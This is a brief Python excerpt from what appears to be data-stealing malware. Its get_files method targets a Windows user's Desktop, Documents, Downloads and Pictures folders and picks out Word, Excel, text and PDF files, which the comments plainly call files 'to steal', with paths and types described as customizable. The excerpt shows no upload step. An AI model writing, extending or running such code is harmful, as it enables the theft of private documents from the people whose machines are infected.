...
class File():
    ...
    def get_files(self):
        src = ["C:\\Users\\%s\\Desktop" % (self.user), "C:\\Users\\%s\\Documents" % (self.user), # These are the paths where we get the files and they are customizable.
               "C:\\Users\\%s\\Downloads" % (self.user), "C:\\Users\\%s\\Pictures" % (self.user)]  
        ext = ["*.docx", "*.xlsx", "*.txt", "*.pdf"] # These are the extenions to determine file types to steal and they are customizable too.
